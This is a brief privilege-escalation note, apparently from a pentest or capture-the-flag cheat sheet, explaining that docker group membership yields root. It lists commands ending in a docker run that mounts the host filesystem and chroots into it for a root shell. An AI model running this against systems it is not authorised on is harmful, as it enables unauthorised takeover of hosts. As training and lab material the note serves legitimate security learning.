To gain root privileges through docker, the user we are logged in with must be in the docker group.

```
id
```






```
docker image ls
```

```
docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it ubuntu chroot /mnt bash
```
